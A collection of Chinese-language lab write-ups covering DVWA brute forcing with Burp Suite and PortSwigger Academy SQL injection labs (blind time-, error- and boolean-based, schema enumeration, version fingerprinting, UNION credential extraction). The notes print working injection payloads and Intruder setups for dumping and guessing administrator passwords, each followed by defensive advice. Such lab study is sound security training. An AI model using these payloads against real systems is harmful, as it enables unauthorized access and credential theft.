【实战笔记】DVWA 暴力破解：从 Low 到 High 的通关指南

0. 前言

暴力破解（Brute Force）是针对身份验证最直接的攻击手段。通过遍历预定义的字典，尝试匹配正确的用户名和密码。在 DVWA 靶场中，我们将通过 Burp Suite 演示如何针对不同防御等级（从无防御到 Token 防御）进行破解测试。

1. 核心原理简述

暴力破解的本质是枚举。但在实际应用中，开发者会加入各种机制来提高破解成本：

  1. Low 级别：没有任何防御，直接根据返回包的长度或关键词判断结果。
  2. Medium 级别：加入了后端延时和失败限制，尝试增加攻击的时间成本。
  3. High 级别：引入了 Anti-CSRF Token，每次请求都需要携带上一次返回的唯一 Token，使得简单的自动化工具失效。

2. 实验环境与工具

  • 靶场：DVWA (Damn Vulnerable Web App)
  • 工具：Burp Suite Professional / Community Edition
  • 字典：常用的弱口令字典（如 top100_passwords.txt）

3. 靶场复现过程

3.1 Low 级别（无防御）

思路：直接爆破。

  1. 截包：在登录页面输入 admin/123，由 Burp Suite 拦截请求。
  2. 设置 Intruder：将 username 和 password 设置为攻击位置。
  3. 设置 Payload：使用 Cluster Bomb (集束炸弹) 模式，分别加载用户名和密码字典。
  4. 识别成功标志：观察返回包长度。正确的凭据通常会返回 HTTP 302 跳转或包含 “Welcome” 字样的页面，其长度与失败请求（显示 “Login failed”）明显不同。

3.2 Medium 级别（延时防御）

思路：源码中加入了 sleep(2)，失败后会暂停 2 秒。

  1. 现象：爆破速度明显变慢。
  2. 对策：在 Burp Intruder 的 Resource Pool 中调低并发线程数，保持耐心，或者寻找是否存在其他绕过方式。由于它只是简单的延时，爆破逻辑与 Low 级别完全一致。

3.3 High 级别（Anti-CSRF Token 防御）

思路：每个登录请求都包含一个隐藏字段 user_token，且该 Token 随页面刷新而改变。

  1. 核心挑战：简单的 Intruder 无法自动获取并填充动态 Token。
  2. Burp Suite 解决方案：
    • Macros (宏)：在 Settings -> Sessions 中配置宏，让 Burp 在每次请求前先访问登录页面抓取最新的 user_token。
    • Intruder 设置：
      • 攻击类型选择 Pitchfork。
      • 第一个 Payload 设为密码字典，第二个 Payload 设为 Recursive Grep（递归提取）。
      • 在 Options -> Grep - Extract 中找到响应包里的 user_token 并进行提取。
  3. 执行结果：Burp 会自动将上一次响应中的 Token 放入下一次请求，成功绕过防御实现爆破。

4. 防御建议与总结

暴力破解的有效防御手段：

  1. 多因素认证 (MFA)：即使密码被破获，没有验证码或生物识别也无法登录。
  2. 锁定策略：在连续尝试失败 N 次后，锁定账号或 IP 一段时间。
  3. 验证码 (CAPTCHA)：引入人机交互验证（如 Google reCAPTCHA），有效阻断全自动化工具。
  4. 强密码策略：要求密码包含大小写字母、数字及特殊符号，增加字典爆破的难度。
  5. Anti-CSRF Token：虽然 High 级别被我们绕过了，但在实战中，配合验证码的 Token 会让暴力破解变得极其艰难。

总结

从 Low 到 High 的过程，本质上是攻击成本与防御强度的博弈。作为渗透测试人员，我们需要掌握如何利用 Burp Suite 的高级功能（如 Macro 和 Recursive Grep）来处理动态参数。

【实战笔记】OWASP Top 10 - 基于时间延迟的时间盲注 (Time-Based Blind SQLi)

0. 前言

当一个 Web 应用不仅不回显数据，甚至连报错信息都进行了完美处理（不返回 500 错误）时，布尔盲注和报错盲注都会失效。此时，我们最后的手段是时间盲注。通过向数据库发送带有“延时函数”的指令，观察服务器响应是否出现了明显的延迟，从而像敲击摩斯密码一样，一比特一比特地扣出数据库内容。

1. 漏洞原理简述

时间盲注（Time-Based Blind SQLi） 是一种通过观察服务器处理请求所花费的时间来推断信息的攻击方式。

核心逻辑：

  1. 注入延时函数：利用数据库特有的函数（如 PostgreSQL 的 pg_sleep()）强制数据库挂起一段时间。
  2. 构造条件分支：结合 IF 或 CASE WHEN。如果条件为 真，则执行延时；如果为 假，则立即返回。
  3. 观察响应时长：
    • 响应延迟（如 >10秒）：说明判断条件为 真。
    • 响应即时（如 <1秒）：说明判断条件为 假。

2. 核心 Payload 与函数分析 (PostgreSQL)

关键函数：

  • pg_sleep(seconds)：PostgreSQL 特有的函数，使当前会话进程暂停指定的秒数。
  • CASE WHEN (condition) THEN pg_sleep(10) ELSE pg_sleep(0) END：逻辑判断分支。

实验探测 Payload：

' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)--

逻辑解析：

  • 如果数据库支持此函数且注入成功，浏览器转圈圈的时间会明显变长（10秒）。
  • 这是盲注中最耗时的一种方式，因为每测试一个字符，如果猜对了，你都必须等待那 10 秒。

3. 靶场复现过程

实验环境：PortSwigger Academy - Blind SQL injection with time delays

复现步骤：

  1. 确认注入点与延时机制：
    修改 TrackingId Cookie：

    • TrackingId=xyz' || pg_sleep(10)--
      观察 Burp Suite 中的 Response Received 时间。如果显示为 10,000 millis 左右，说明延时注入成功。

  2. 探测表与用户是否存在：
    注入：' || (SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--
    观察到 10 秒延迟，确认目标存在。

  3. 探测密码长度：
    注入：' || (SELECT CASE WHEN (username='administrator' AND LENGTH(password)>19) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--
    当长度判断 >19 时延迟，>20 时不延迟。确认长度为 20位。

  4. 自动化爆破 (使用 Burp Intruder 或脚本)：

    • Payload：...SUBSTR(password, §1§, 1) = '§a§' THEN pg_sleep(10)...
    • Intruder 技巧：在结果列表中查看 “Time received” 或 “Response completed” 列。
    • 筛选：寻找响应时间显著高于其他请求（例如 >10000ms）的条目。

  5. 执行结果：
    根据时间延迟特征，依次记录下每一位的正确字符，拼接得到管理员密码。成功登录。

4. 防御建议与总结

关键点总结

  • 效率瓶颈：时间盲注非常缓慢，且容易受到网络波动（抖动）的影响。
  • 资源消耗：大量使用 pg_sleep 或类似函数会占用数据库连接池，可能导致目标网站响应变慢甚至宕机（隐蔽的 DoS 攻击）。

防御方案

  • 首选：参数化查询 (Prepared Statements)。这是所有 SQL 注入的终结者。
  • 数据库配置：限制 Web 应用账户执行 pg_sleep, sleep(), waitfor delay 等高风险系统函数的权限。
  • 监控异常延迟：在 Web 日志或 WAF 中监控大量高延迟且带有 SQL 特征字符的请求。
  • 网络防火墙：设置合理的 HTTP 请求超时时间。

【实战笔记】OWASP Top 10 - 基于条件报错的布尔盲注 (Error-Based Blind SQLi)

0. 前言

如果一个页面无论后端查询成功还是失败，显示的文字都完全一样，我们该如何提取数据？答案是：制造报错。通过构造特定的 SQL 逻辑，让数据库在满足某个条件时触发系统错误（如 500 Internal Server Error），从而通过 HTTP 状态码的差异来“读出”数据。

1. 漏洞原理简述

条件报错盲注（Conditional Errors） 是一种利用数据库逻辑判断来触发运行时错误的技术。

核心逻辑：

  1. 构造条件分支：利用 CASE WHEN 语句进行判断。
  2. 强制触发错误：如果判断为 真，执行一个会导致报错的操作（例如在 Oracle 中查询一个不存在的表，或者进行除以零运算）。
  3. 观察状态码：
    • HTTP 500：说明触发了报错，即我们的判断条件为 真。
    • HTTP 200：说明未触发报错，即我们的判断条件为 假。

2. 核心 Payload 与函数分析 (Oracle)

关键函数：

  • CASE WHEN (condition) THEN (action_if_true) ELSE (action_if_false) END：逻辑判断。
  • TO_CHAR(1/0)：在 Oracle 中，除以零会触发 ORA-01476: divisor is equal to zero 错误。

实验 Payload 结构：

' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '

逻辑解析：

  • 如果 WHEN 后面的条件（如：密码第一位是 ‘a’）成立，数据库会执行 TO_CHAR(1/0)。
  • 此时服务器会返回 500 Internal Server Error。
  • 如果条件不成立，执行 ELSE ''，页面正常返回 200 OK。

3. 靶场复现过程

实验环境：PortSwigger Academy - Blind SQL injection with conditional errors (Oracle)

复现步骤：

  1. 确认注入点与报错机制：
    修改 TrackingId Cookie：

    • TrackingId=xyz' || (SELECT '') || ' -> 200 OK (确认支持注入)
    • TrackingId=xyz' || (SELECT TO_CHAR(1/0) FROM DUAL) || ' -> 500 Error (确认可以通过除零触发报错)

  2. 探测表是否存在：
    ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
    返回 500，确认 users 表和 administrator 用户存在。

  3. 探测密码长度：
    注入：' || (SELECT CASE WHEN LENGTH(password)>19 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
    当长度判断 >19 时报错（500），>20 时正常（200）。确认长度为 20位。

  4. 自动化爆破 (Burp Intruder)：

    • Payload：...SUBSTR(password, §1§, 1) = '§a§' THEN TO_CHAR(1/0)...
    • Intruder 设置：使用 Cluster Bomb，分别遍历位置 (1-20) 和字符 (a-z, 0-9)。
    • 结果筛选：在结果列表中筛选 Status Code 为 500 的请求。

  5. 执行结果：
    收集所有状态码为 500 的字符，按顺序拼接得到密码。使用 administrator 账号登录成功。

4. 防御建议与总结

关键点总结

  • 隐蔽性极高：因为页面内容没有变化，这种漏洞往往被开发者忽略。
  • 数据库差异：不同数据库触发错误的方式不同（如 MySQL 可以使用 EXP(710) 溢出错误）。

防御方案

  • 参数化查询 (Prepared Statements)：这是终结所有 SQL 注入的核武器。
  • 禁用详细错误显示：虽然此攻击利用的是状态码而非错误内容，但屏蔽详细错误信息能增加攻击者的探测难度。
  • 统一响应行为：配置 Web 服务器，使得即使后端数据库报错，也向用户返回一个格式统一、状态码统一的错误页面。

【实战笔记】OWASP Top 10 - 基于条件响应的布尔盲注 (Boolean-Based Blind SQLi)

0. 前言

在之前的实验中，我们利用 UNION 直接将数据“回显”到了页面上。但在现实场景中，许多应用程序虽然存在注入漏洞，却不会在页面上显示任何查询结果。此时，我们需要通过观察应用程序在接收不同指令时返回的条件响应（如：是否显示特定欢迎词）来逐位“猜解”数据库内容。

1. 漏洞原理简述

布尔盲注（Boolean-Based Blind SQLi） 是一种通过使数据库执行逻辑判断，并根据页面响应的差异（真/假）来提取数据的方法。

核心逻辑：

  1. 构造判断题：向数据库提问，例如：“管理员密码的第一位是 ‘a’ 吗？”
  2. 观察响应：
    • 如果页面显示了预期的内容（如 “Welcome back!”），说明判断为真 (True)。
    • 如果页面内容发生变化或缺失，说明判断为假 (False)。
  3. 逐位爆破：利用这种二元状态，配合 SUBSTRING() 函数，我们可以猜解出完整的字符串。

2. 核心 Payload 与函数分析

关键 SQL 函数：

  • SUBSTRING(string, start, length)：截取字符串。SUBSTRING('password', 1, 1) 返回 ‘p’。
  • LENGTH(string)：返回字符串长度。

实验 Payload 结构：

' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username = 'administrator') = 'a'--

逻辑解析：

  • 如果管理员密码的第一位确实是 ‘a’，则 AND 后面的条件为真，整个查询返回结果，页面显示 “Welcome back!”。
  • 如果不是 ‘a’，条件为假，页面不显示 “Welcome back!”。

3. 靶场复现过程

实验环境：PortSwigger Academy - Blind SQL injection with conditional responses

复现步骤：

  1. 确认注入点：
    发现请求中包含 TrackingId Cookie。尝试修改：

    • TrackingId=xyz' AND '1'='1 -> 页面显示 “Welcome back!”
    • TrackingId=xyz' AND '1'='2 -> “Welcome back!” 消失。
      结论：存在布尔盲注漏洞。

  2. 探测密码长度：
    注入：' AND (SELECT LENGTH(password) FROM users WHERE username = 'administrator') > 19--
    通过递增数字，发现当长度为 20 时页面正常，21 时消失。确认密码长度为 20位。

  3. 逐位猜解密码 (自动化攻击)：
    由于手工猜解 20 位密码（每位需尝试 a-z, 0-9）效率太低，使用 Burp Intruder：

    • 位置：...SUBSTRING(password, §1§, 1) = '§a§'--
    • Payload 类型：Cluster Bomb (集束炸弹)。
    • 设置：第一个位置为 1-20 (Numbers)，第二个位置为 a-z, 0-9 (Simple list)。
    • 筛选：在 Intruder 的 Options 中设置 “Grep - Match”，添加 “Welcome back!”。

  4. 执行结果：
    根据 Intruder 筛选出的“真”值，按顺序拼接出 20 位字符串。
    使用 administrator 和该密码成功登录。

4. 防御建议与总结

关键点总结

  • 盲注的代价：盲注不需要回显，但需要大量的 HTTP 请求。实战中常配合二分法（Binary Search）或自动化脚本来提高效率。
  • 隐蔽性：这种漏洞在扫描器不开启深度探测时较难发现，但危害巨大。

防御方案

  • 参数化查询 (Prepared Statements)：无论是否盲注，预编译始终是终结 SQL 注入的最强防御。
  • 通用错误处理：确保无论数据库查询成功还是失败，页面返回的信息量尽可能一致，不给攻击者留下区分“真假”的机会。
  • 频率限制 (Rate Limiting)：盲注依赖大量请求，通过限制同一 IP 的请求频率可以有效减缓攻击。

【实战笔记】OWASP Top 10 - SQL 注入：Oracle 数据库全库信息枚举

0. 前言

在之前的笔记中，我们利用 information_schema 完成了对 MySQL 和 PostgreSQL 的脱库。然而，Oracle 数据库并不支持该标准架构，它拥有一套独特的系统视图。

本文记录了在 PortSwigger 靶场中，针对 Oracle 环境进行表名枚举、列名提取并最终获取管理员凭据的全过程。

1. 漏洞原理简述

Oracle 数据库使用专门的内置视图来管理元数据。在进行 UNION 注入时，我们需要熟悉以下核心视图：

核心视图：

  1. all_tables：存储当前用户可访问的所有表的信息。关键字段为 TABLE_NAME。
  2. all_tab_columns：存储所有表的列信息。关键字段为 COLUMN_NAME。

Oracle 的限制提醒：

  • 必须有 FROM 子句：即使查询系统变量，也需要 FROM DUAL 或目标表。
  • 类型匹配：Oracle 对列的数据类型检查非常严格，必须确保 UNION 对应的列类型完全一致。

2. 核心探测流程与 Payload

第一步：枚举所有表名

Payload:
' UNION SELECT table_name, NULL FROM all_tables--
目的：寻找存放敏感信息的表（Oracle 的表名通常是大写的，如 USERS_ABCDEF）。

第二步：枚举指定表的列名

假设目标表名为 USERS_XTZPQW：
Payload:
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_XTZPQW'--
目的：识别对应的用户名和密码字段。

第三步：提取最终数据

Payload:
' UNION SELECT USERNAME_FIELD, PASSWORD_FIELD FROM USERS_XTZPQW--

3. 靶场复现过程

实验环境：PortSwigger Academy - SQL injection attack, listing the database contents on Oracle

复现步骤：

  1. 确定列数与类型：
    通过 ' ORDER BY 2-- 确认原始查询为 2 列，且均为字符串类型。

  2. 枚举表名：
    注入：' UNION SELECT table_name, NULL FROM all_tables--
    在返回的长列表中，发现了一个格式特殊的表名：USERS_ABCDEF（带随机后缀）。

  3. 枚举列名：
    针对该表查询其包含的字段：
    注入：' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_ABCDEF'--
    得到结果：USERNAME_GHIJKL 和 PASSWORD_MNOPQR。

  4. 数据提取：
    构造最后的 UNION 查询：
    注入：' UNION SELECT USERNAME_GHIJKL, PASSWORD_MNOPQR FROM USERS_ABCDEF--
    页面成功回显了 administrator 的密码。

  5. 执行结果：
    使用获取到的账号密码成功登录。

4. 防御建议与总结

关键点总结

  • 大小写敏感：在 Oracle 的系统表中，TABLE_NAME 存储的值默认是大写的。在 WHERE 子句中过滤时必须注意这一点。
  • 权限隔离：使用 all_tables 只能看到当前用户有权访问的表，而 dba_tables 则需要更高权限，这体现了 Oracle 的安全分级。

防御方案

  • 预编译处理：使用 OraclePreparedStatement 绑定参数。
  • 细粒度权限控制：限制 Web 应用数据库账号的权限，使其无法访问 all_tables 和 all_tab_columns 等敏感系统视图。
  • 数据加密：敏感信息（如密码）应加盐哈希后再存储，即便发生 SQL 注入脱库，攻击者也无法直接获得明文。

【实战笔记】OWASP Top 10 - SQL 注入：非 Oracle 数据库全库信息枚举

0. 前言

在真实的渗透测试中，我们往往不知道目标表的名称和列的结构。对于非 Oracle 数据库（如 MySQL, PostgreSQL, MSSQL），我们可以利用标准的 information_schema 视图来像剥洋葱一样，一层层提取出数据库名、表名和列名。

本文记录了在 PortSwigger 靶场中从零开始枚举数据库内容并提取管理员凭据的过程。

1. 漏洞原理简述

information_schema 是 SQL 标准中定义的一个内置架构，它包含了数据库中所有其他数据库、表、列以及权限的信息。

核心视图：

  1. information_schema.tables：存储所有表的信息。通过 table_name 字段获取表名。
  2. information_schema.columns：存储所有列的信息。通过 column_name 字段获取列名。

通过 UNION SELECT 结合这些视图，我们可以实现对数据库结构的完全映射。

2. 核心探测流程与 Payload

第一步：获取所有表名

Payload:
' UNION SELECT table_name, NULL FROM information_schema.tables--
目的：在结果集中寻找看起来像存储用户凭据的表（如 users_abcdef）。

第二步：获取指定表的列名

假设目标表名为 users_pgkvqy：
Payload:
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_pgkvqy'--
目的：识别存储用户名和密码的列（如 username_column 和 password_column）。

第三步：提取最终数据

Payload:
' UNION SELECT username_column, password_column FROM users_pgkvqy--

3. 靶场复现过程

实验环境：PortSwigger Academy - SQL injection attack, listing the database contents on non-Oracle databases

复现步骤：

  1. 确定列数与类型：
    经测试，原始查询有 2 列，且均为字符串类型。

  2. 枚举表名：
    注入：' UNION SELECT table_name, NULL FROM information_schema.tables--
    在返回的列表中，发现了一个异常的表名：users_vpxclz。

  3. 枚举列名：
    针对该表查询其列名：
    注入：' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_vpxclz'--
    得到列名：username_qwedsa 和 password_asdzxc。

  4. 脱库获取凭据：
    注入：' UNION SELECT username_qwedsa, password_asdzxc FROM users_vpxclz--
    页面显示了所有用户的明文账号密码。

  5. 执行结果：
    使用提取到的 administrator 密码成功登录。

4. 防御建议与总结

关键点总结

  • 元数据保护：information_schema 的存在极大地便利了攻击者。虽然不能直接删除它，但可以通过权限控制限制其访问。
  • 混淆表名：一些框架会给表名加随机后缀（如本实验中的 users_vpxclz），但这只能防范盲猜，无法防御通过 information_schema 进行的枚举。

防御方案

  • 强制使用预编译语句：这是唯一的根治方案。
  • 最小化数据库权限：Web 应用的数据库用户不应拥有查询 information_schema 的权限。
  • 关闭详细报错：防止攻击者通过报错信息（如 Table 'xxx' not found）来推测表结构。

【实战笔记】OWASP Top 10 - SQL 注入：MySQL 与 Microsoft SQL Server 指纹识别

0. 前言

在渗透测试中，识别目标数据库是 MySQL 还是 SQL Server 至关重要。虽然两者在许多基础语法上相似，但在获取系统版本信息和处理注释符时存在细微却致命的差异。本文记录了在 PortSwigger 靶场中针对这两类数据库进行版本探测的过程。

1. 漏洞原理简述

不同数据库通过不同的全局变量或内置函数来暴露其版本信息。

核心差异对比：

特性 MySQL Microsoft SQL Server (MSSQL)
版本查询函数 @@version 或 version() @@version
注释符 # 或 -- (注意杠杠后有空格) --
FROM 子句 可选（不需要虚拟表） 可选

2. 核心 Payload 分析

探测列数

两者均可使用递增索引排序：
' ORDER BY 2--

提取版本信息 (MSSQL)

Payload:
' UNION SELECT @@version, NULL--

提取版本信息 (MySQL)

Payload:
' UNION SELECT @@version, NULL#
或者：
' UNION SELECT version(), NULL-- (注意 -- 后面必须接一个空格，否则在 MySQL 中不生效)

逻辑解析：

  • @@version：这是 MSSQL 和 MySQL 通用的全局变量，用于返回服务器的详细版本字符串。
  • 注释符差异：
    • MSSQL 接受标准的 -- 注释。
    • MySQL 的 -- 必须配合空格使用（-- ），或者直接使用 #。在 URL 环境中，# 需要编码为 %23。

3. 靶场复现过程

实验环境：PortSwigger Academy - SQL injection attack, querying the database type and version on MySQL and Microsoft

复现步骤：

  1. 确定列数：
    在 URL 参数中注入 ' ORDER BY 2%23 (使用 MySQL 的 # 编码)。
    页面响应正常；尝试 ' ORDER BY 3%23 报错。确认为 2 列。

  2. 寻找文本列：
    输入 ' UNION SELECT 'abc', 'def'%23。
    观察发现两列均可渲染字符串。

  3. 获取版本信息：
    由于不确定是哪种数据库，先尝试通用的 @@version：
    category=Gifts' UNION SELECT @@version, NULL%23

  4. 执行结果：
    页面输出了详细的版本信息，从而判定目标为 MySQL 数据库，实验成功。

4. 防御建议与总结

关键点总结

  • 空格陷阱：在针对 MySQL 进行注入时，如果使用 -- 而不加空格（或 URL 编码的 %20），会导致语法错误。这是实战中极易忽略的细节。
  • 联合测试：如果 ' UNION SELECT NULL-- 报错而 ' UNION SELECT NULL# 成功，可以立刻判定后端为 MySQL。

防御方案

  • 预编译语句（Prepared Statements）：强制将所有用户输入作为参数处理，使 @@version 等敏感变量无法被注入执行。
  • 最小化数据库报错：配置 Web 服务器仅返回通用错误页面（如 500 页面），不回显底层 SQL 语法错误。
  • 输入清理：对输入参数进行严格的类型检查（如 category 应只允许预定义的字符串）。

【实战笔记】OWASP Top 10 - SQL 注入：Oracle 数据库版本指纹识别

0. 前言

在进行 SQL 注入攻击时，识别后端数据库的类型和版本是至关重要的一步。不同的数据库（如 MySQL, PostgreSQL, Oracle, SQL Server）有着不同的语法特性和系统表。本文记录了针对 Oracle 数据库进行版本信息查询的实战过程。

1. 漏洞原理简述

在 UNION 注入中，如果我们想查询数据库版本，必须调用该数据库特有的系统变量或内置视图。

Oracle 的特殊性：

  1. 强制 FROM 子句：在 Oracle 中，任何 SELECT 语句都必须包含 FROM 关键字。如果你只想查询一个常量或函数，必须使用内置的虚拟表 DUAL。
  2. 版本视图：Oracle 的版本信息存储在 v$version 视图中。

2. 核心 Payload 分析

探测列数

首先通过 ORDER BY 确定列数：
' ORDER BY 2--

探测文本列（注意 DUAL）

由于 Oracle 必须带 FROM，探测 Payload 如下：
' UNION SELECT 'abc', NULL FROM DUAL--

提取版本信息

Payload:
' UNION SELECT banner, NULL FROM v$version--

逻辑解析：

  • banner：这是 v$version 视图中存储版本详情的列名。
  • v$version：Oracle 存储版本和补丁信息的动态性能视图。
  • FROM v$version：符合 Oracle 的语法规范，取代了 MySQL 等数据库可以直接 SELECT @@version 的做法。

3. 靶场复现过程

实验环境：PortSwigger Academy - SQL injection attack, querying the database type and version on Oracle

复现步骤：

  1. 确定列数：
    输入 ' ORDER BY 2-- 正常显示，' ORDER BY 3-- 报错。确认有 2 列。
  2. 寻找文本列：
    输入 ' UNION SELECT 'abc', 'def' FROM DUAL--。
    观察发现两列都可以正常渲染字符串。
  3. 查询版本信息：
    构造最终注入语句，放入 category 参数中：
    category=Gifts' UNION SELECT banner, NULL FROM v$version--
    （或者使用 UNION SELECT banner, 'any_string' FROM v$version--）
  4. 执行结果：
    页面输出了类似 Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production 的内容，实验成功完成。

4. 防御建议与总结

关键点总结

  • 指纹识别：通过报错信息或特定表（如 DUAL）的存在，可以快速锁定后端为 Oracle 数据库。
  • 语法差异：实战中如果发现常规 UNION SELECT NULL, NULL-- 报错，应优先尝试补全 FROM DUAL。

防御方案

  • 使用参数化查询：无论数据库类型如何，预编译始终是最核心的防御方案。
  • 屏蔽错误回显：在生产环境中，应关闭详细的数据库错误信息，防止攻击者通过报错获取数据库类型和表结构信息。
  • WAF 规则更新：针对常见的系统视图（如 v$version, information_schema）设置拦截规则。

【实战笔记】OWASP Top 10 - SQL 注入：单列多值提取（字符串拼接技巧）

0. 前言

在之前的实验中，我们运气很好，原始查询提供了多个文本列供我们提取数据。但在现实场景中，可能原始查询只有两个列，且其中只有一个列支持字符串类型。如果我们想同时提取用户名和密码，就需要用到**字符串拼接（String Concatenation）**技术。

1. 漏洞原理简述

当 UNION 注入中可用的“文本列”数量少于我们需要提取的字段数量时，我们可以将多个字段合并成一个单独的字符串，并放入那唯一的文本列中。

通过在字段之间插入自定义的分隔符（如 ~ 或 :），我们可以在获取结果后轻松拆分出原始数据。

2. 核心 Payload 分析

不同数据库系统的字符串拼接语法有所不同：

  • PostgreSQL/Oracle: username || '~' || password
  • MySQL: CONCAT(username, '~', password)
  • Microsoft SQL Server: username + '~' + password

本实验 Payload (PostgreSQL):

' UNION SELECT NULL, username || '~' || password FROM users--

逻辑解析：

  1. NULL：由于第一列不支持文本或不需要使用，我们用 NULL 占位。
  2. username || '~' || password：利用双竖线 || 将用户名、分隔符 ~ 和密码连接成一个长字符串。例如，结果会显示为 administrator~s3cret。
  3. FROM users：从用户表中读取数据。

3. 靶场复现过程

实验环境：PortSwigger Academy - SQL injection UNION attack, retrieving multiple values in a single column

复现步骤：

  1. 探测列数：
    使用 ' ORDER BY 2-- 正常，' ORDER BY 3-- 报错，确认共有 2 列。
  2. 寻找文本列：
    • ' UNION SELECT 'abc', NULL-- -> 报错 500。
    • ' UNION SELECT NULL, 'abc'-- -> 成功。
    • 结论：只有第二列可以用来提取数据。
  3. 构造拼接 Payload：
    由于只有一个列可用，我们需要将 username 和 password 拼在一起：
    category=Gifts' UNION SELECT NULL, username || '~' || password FROM users--
  4. 获取并登录：
    在页面上找到 administrator 开头的行，例如：administrator~m37z98...。
    提取出分隔符后的密码，成功登录管理员账号。

4. 防御建议与总结

关键点总结

  • 灵活性：字符串拼接打破了列数的物理限制。
  • 特征化：使用特殊的分隔符可以防止数据本身包含类似字符导致混淆。

防御方案

  • 预编译语句（Prepared Statements）：这是防御所有 UNION 注入的终极方案。
  • 输出编码：即使数据被注入，如果前端对展示内容进行了严格的 HTML 编码，也可以在一定程度上防止伴随而来的 XSS 攻击。

【实战笔记】OWASP Top 10 - SQL 注入：利用 UNION 提取跨表敏感数据

0. 前言

在掌握了确定列数和寻找文本列的技巧后，我们终于来到了 UNION 注入最具杀伤力的环节：跨表查询。通过联合查询，我们可以诱导数据库将原本不应公开的表（如用户信息表）中的内容，通过合法的页面显示出来。

本文记录了在 PortSwigger 学院中完成“从其他表中检索数据”的实战过程。

1. 漏洞原理简述

跨表提取（Retrieving Data from Other Tables） 的核心在于将原始查询的结果集与我们自定义的查询结果集合并。

在已知列数和可用文本列的前提下，我们可以构造如下逻辑：
SELECT name, description FROM products WHERE category = 'Gifts' UNION SELECT username, password FROM users

此时，数据库会将 users 表中的 username 填充到原本显示商品名称的位置，将 password 填充到显示描述的位置，从而实现敏感信息的脱库。

2. 核心 Payload 分析

本次实验的关键在于如何精准地定位目标表和目标列。

Payload 构造：

' UNION SELECT username, password FROM users--

逻辑解析：

  • UNION SELECT：发起联合查询请求。
  • username, password：这是我们想要获取的字段名。在实际渗透中，若字段名未知，通常需要查询 information_schema.columns。
  • FROM users：指定目标表名为 users。
  • --：注释掉原始查询后续的 SQL 逻辑，防止语法报错。

执行流程图解：

  1. 原始查询：SELECT A, B FROM table1
  2. 注入后：SELECT A, B FROM table1 UNION SELECT username, password FROM users
  3. 最终页面：在原本展示商品 A 的位置显示了 administrator，在展示 B 的位置显示了其明文密码。

3. 靶场复现过程

实验环境：PortSwigger Academy - SQL injection UNION attack, retrieving data from other tables

前提条件：

  • 通过测试发现列数为 2 列。
  • 确认两列均为 字符串（String） 类型。

复现步骤：

  1. 确定目标：已知目标表名为 users，目标字段为 username 和 password。
  2. 构造并发送 Payload：
    在商品分类过滤处的 URL 参数中注入：
    category=Gifts' UNION SELECT username, password FROM users--
  3. 获取数据：
    刷新页面后，观察页面渲染内容。除了正常的商品信息外，页面底部多出了所有用户的账号和密码。
  4. 完成攻击：
    找到 administrator 的对应密码，登录系统。

4. 防御建议与实战总结

防御手段

  • 预编译（Prepared Statements）：依然是金科玉律。它让攻击者无法通过单引号 ’ 闭合语句来改变 SQL 的逻辑结构。
  • 最小权限原则（PoLP）：在数据库层面，Web 应用的账号不应具备跨库查询或访问系统敏感表（如 users）的权限，除非业务绝对必要。

实战总结

在真实的渗透测试中，你可能无法预先知道表名和列名。此时你需要一套标准的“侦察流程”：

  1. 探测列数 (ORDER BY)。
  2. 探测数据类型 (UNION SELECT NULL...)。
  3. 查库名 (database(), current_database() 等)。
  4. 查表名 (利用 information_schema.tables)。
  5. 查列名 (利用 information_schema.columns)。
  6. 提取数据。
